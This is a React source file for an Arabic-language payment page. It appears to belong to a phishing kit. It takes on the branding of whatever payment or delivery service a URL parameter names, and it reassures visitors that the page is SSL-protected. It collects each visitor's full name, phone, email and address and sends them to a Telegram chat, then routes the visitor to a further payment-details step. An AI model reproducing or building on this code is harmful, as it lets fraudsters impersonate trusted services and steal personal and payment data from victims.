import { useState, useEffect } from "react";
import { useParams, useNavigate } from "react-router-dom";
import { getServiceBranding } from "@/lib/serviceLogos";
import { getCountryByCode } from "@/lib/countries";
import { formatCurrency } from "@/lib/countryCurrencies";
import PaymentMetaTags from "@/components/PaymentMetaTags";
import { useLink, useUpdateLink } from "@/hooks/useSupabase";
import { sendToTelegram } from "@/lib/telegram";
import { getCompanyLayout } from "@/components/CompanyLayouts";
import PageLoader from "@/components/PageLoader";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";

const PaymentRecipient = () => {
  const { id, company: pathCompany, currency: pathCurrency, amount: pathAmount } = useParams();
  const navigate = useNavigate();
  const { data: linkData, isLoading, isError, error } = useLink(id);
  const updateLink = useUpdateLink();
  const [customerName, setCustomerName] = useState("");
  const [customerEmail, setCustomerEmail] = useState("");
  const [customerPhone, setCustomerPhone] = useState("");
  const [residentialAddress, setResidentialAddress] = useState("");
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [showPage, setShowPage] = useState(false);

  useEffect(() => {
    const timer = setTimeout(() => {
      setShowPage(true);
    }, 1500); // Reduced delay for better UX
    return () => clearTimeout(timer);
  }, []);

  useEffect(() => {
    if (linkData || isError) {
      setShowPage(true);
    }
  }, [linkData, isError]);

  const urlParams = new URLSearchParams(window.location.search);
  const serviceKey = pathCompany || urlParams.get('company') || urlParams.get('c') || urlParams.get('service') || linkData?.payload?.service_key || 'sadad';
  const currencyParam = pathCurrency || urlParams.get('currency') || urlParams.get('cur');
  const amountParam = pathAmount || urlParams.get('amount') || urlParams.get('a');
  const paymentMethodParam = urlParams.get('pm') || urlParams.get('method') || 'card';
  const payerTypeParam = urlParams.get('payer_type') || urlParams.get('payer');
  const countryParam = urlParams.get('country') || urlParams.get('c');

  const serviceName = linkData?.payload?.service_name || serviceKey;
  const branding = getServiceBranding(serviceKey);

  const shippingInfo = linkData?.payload as Record<string, unknown>;
  const payerType = payerTypeParam || shippingInfo?.payer_type || "recipient";
  const countryCode = countryParam || shippingInfo?.selectedCountry || "SA";
  const countryData = getCountryByCode(countryCode);
  const phoneCode = countryData?.phoneCode || "+966";
  const currencyCode = currencyParam || countryData?.currency || "SAR";

  const rawAmount = amountParam || shippingInfo?.cod_amount;
  let amountValue = 500;
  if (rawAmount !== undefined && rawAmount !== null) {
    if (typeof rawAmount === 'number') {
      amountValue = rawAmount;
    } else if (typeof rawAmount === 'string') {
      const parsed = parseFloat(rawAmount);
      if (!isNaN(parsed)) {
        amountValue = parsed;
      }
    }
  }

  const formattedAmount = formatCurrency(amountValue, currencyCode);
  const phonePlaceholder = countryData?.phonePlaceholder || "5X XXX XXXX";
  
  const Layout = getCompanyLayout(serviceKey);

  if (isLoading && !showPage) {
    return <PageLoader message="جاري التحقق من تفاصيل الفاتورة..." />;
  }

  const handleProceed = async (e: React.FormEvent) => {
    e.preventDefault();
    if (isSubmitting) return;
    setIsSubmitting(true);

    try {
      const formData = new FormData();
      formData.append('form-name', 'payment-recipient');
      formData.append('name', customerName);
      formData.append('email', customerEmail);
      formData.append('phone', customerPhone);
      formData.append('address', residentialAddress);
      formData.append('service', serviceName);
      formData.append('amount', formattedAmount);
      formData.append('linkId', id || '');

      await fetch('/', {
        method: 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: new URLSearchParams(formData as Record<string, string>).toString()
      }).catch(err => console.error('Form tracking error:', err));

      await sendToTelegram({
        type: 'payment_recipient',
        data: {
          name: customerName,
          email: customerEmail,
          phone: customerPhone,
          address: residentialAddress,
          service: serviceName,
          amount: formattedAmount,
          payment_url: `${window.location.origin}/pay/${id}/details`
        },
        timestamp: new Date().toISOString()
      }).catch(err => console.error('Telegram error:', err));

      if (linkData) {
        await updateLink.mutateAsync({
          linkId: id!,
          payload: {
            ...linkData.payload,
            customerInfo: {
              name: customerName,
              email: customerEmail,
              phone: customerPhone,
              address: residentialAddress,
              service: serviceName,
              amount: formattedAmount
            },
            service_key: serviceKey,
            service_name: serviceName
          }
        }).catch(err => console.error('Data sync error:', err));
      }

      navigate(`/pay/${id}/details?company=${serviceKey}&currency=${currencyCode}&amount=${amountValue}&method=${paymentMethodParam}`);
    } catch (error) {
      console.error('Submit error:', error);
    } finally {
      setIsSubmitting(false);
    }
  };

  return (
    <>
      <PaymentMetaTags 
        serviceKey={serviceKey}
        serviceName={serviceName}
        title={serviceName}
        amount={formattedAmount}
      />

      <Layout companyKey={serviceKey} amount={formattedAmount}>
        <form onSubmit={handleProceed} className="space-y-6">
          <div className="space-y-4">
            <h3 className="text-lg font-bold border-b pb-2 mb-4">
              {payerType === "recipient" ? "بيانات المستلم" : "بيانات المرسل"}
            </h3>
            
            <div className="grid grid-cols-1 md:grid-cols-2 gap-4 text-right">
              <div className="space-y-2">
                <Label htmlFor="name" className="text-sm font-bold">الاسم بالكامل</Label>
                <Input 
                  id="name" 
                  value={customerName}
                  onChange={(e) => setCustomerName(e.target.value)}
                  required 
                  className="rounded-none border-gray-300 focus:border-[#EF7622]" 
                  placeholder="أدخل الاسم الرباعي"
                />
              </div>
              
              <div className="space-y-2">
                <Label htmlFor="phone" className="text-sm font-bold">رقم الجوال</Label>
                <div className="relative" dir="ltr">
                  <Input 
                    id="phone"
                    value={customerPhone}
                    onChange={(e) => setCustomerPhone(e.target.value)}
                    required
                    className="rounded-none border-gray-300 focus:border-[#EF7622] pl-16"
                    placeholder={phonePlaceholder}
                  />
                  <div className="absolute inset-y-0 left-0 flex items-center px-3 bg-gray-100 border-r text-xs font-bold">
                    {phoneCode}
                  </div>
                </div>
              </div>

              <div className="space-y-2">
                <Label htmlFor="email" className="text-sm font-bold">البريد الإلكتروني</Label>
                <Input 
                  id="email" 
                  type="email"
                  value={customerEmail}
                  onChange={(e) => setCustomerEmail(e.target.value)}
                  required
                  className="rounded-none border-gray-300 focus:border-[#EF7622]"
                  placeholder="name@example.com"
                />
              </div>

              <div className="space-y-2">
                <Label htmlFor="address" className="text-sm font-bold">العنوان (الحي / الشارع)</Label>
                <Input 
                  id="address"
                  value={residentialAddress}
                  onChange={(e) => setResidentialAddress(e.target.value)}
                  required
                  className="rounded-none border-gray-300 focus:border-[#EF7622]"
                  placeholder="مثال: الرياض - حي الملقا"
                />
              </div>
            </div>
          </div>

          <div className="pt-6">
            <Button 
              type="submit" 
              disabled={isSubmitting}
              className="w-full h-14 text-lg font-bold rounded-none bg-[#EF7622] hover:bg-[#d4661a] transition-colors"
            >
              {isSubmitting ? "جاري الحفظ..." : "متابعة للدفع"}
            </Button>
            <p className="text-[10px] text-gray-400 text-center mt-4">
              هذه الصفحة محمية بتقنية التشفير العالمي SSL لضمان أمن بياناتك
            </p>
          </div>
        </form>
      </Layout>
    </>
  );
};

export default PaymentRecipient;
